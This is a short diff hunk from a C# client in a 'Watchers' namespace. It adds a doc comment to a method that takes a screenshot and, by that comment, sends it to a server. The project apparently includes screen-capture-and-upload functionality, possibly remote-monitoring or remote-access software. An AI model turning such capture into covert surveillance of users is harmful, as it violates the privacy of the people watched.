@@ -136,7 +136,9 @@ namespace Client.Armitage.Watchers
             }
             /// This way we get waaaaay smaller filesize.
         }
-
+        /// <summary>
+        /// Sends a screenshot to the server.
+        /// </summary>
         public async static void SendOne() {
             await Task.Run(() => {
                 var bytes = Screenshot();
